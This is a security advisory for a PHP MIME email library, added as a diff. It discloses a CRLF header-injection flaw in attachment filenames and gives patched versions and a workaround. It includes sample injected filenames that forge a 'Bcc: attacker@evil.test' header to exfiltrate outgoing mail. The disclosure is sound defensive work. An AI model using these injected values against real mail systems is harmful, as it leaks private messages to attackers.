@@ -1,0 +1,30 @@
+Impact
+A CRLF (carriage-return / line-feed) header injection affecting any application that uses this library to build or forward MIME messages with an attacker-influenced attachment filename.
+
+Attachment filenames are interpolated into the Content-Type and Content-Disposition header values without stripping CR/LF, so a filename containing \r\n serializes as one or more additional, attacker-controlled header lines (for example a forged Bcc: that silently exfiltrates a copy of the outgoing message). The untrusted filename can come directly from parsed inbound mail, so no local construction is required — an application that re-attaches or re-sends a parsed filename is exposed.
+
+Details
+On the outbound side, MultipartHelper::createAndAddPartForAttachment() sanitizes the filename only with iconv('UTF-8','US-ASCII//translit//ignore', $filename). CR and LF are valid US-ASCII, so they survive that filter, and the value is then written into the header verbatim via MimePart::setRawHeader(). A filename of doc\r\nBcc: attacker@evil.test therefore serializes as:
+
+Content-Disposition: attachment;
+ filename="doc
+Bcc: attacker@evil.test"
+The filename value closes after doc, and Bcc: attacker@evil.test stands as its own header line.
+
+The decode side is affected as well, which is what makes purely inbound exploitation possible:
+
+ParameterPart::decodePartValue() rawurldecode()s an RFC 2231 filename*= parameter with no control-character stripping, so
+a crafted filename*=utf-8''doc%0D%0ABcc:... makes getFilename() return a string with embedded \r\n.
+The RFC 2047 path (MimeToken) strips \r/\n from the encoded word, but then base64/quoted-printable-decodes it, which
+can reintroduce CR/LF into the decoded value.
+As a result getFilename() can already hand back a value containing newlines for crafted inbound mail, which then flows into outbound headers when that filename is reused.
+
+Patches
+Fixed in 4.0.2 and 3.0.6. Users should upgrade to one of these (or later) versions.
+
+Versions 1.x and 2.x are also affected but are end-of-life and will not receive patches; users on those lines should upgrade to a fixed release.
+
+Workarounds
+If upgrading is not immediately possible, strip CR and LF from any filename before passing it to attachment APIs, and from the result of getFilename() before reusing it in a constructed message — e.g. preg_replace('/[\r\n]+/', ' ', $filename).
+
+Found and reported privately by Ilia Alshanetsky (@iliaal), who also proposed fixes that informed the patches.
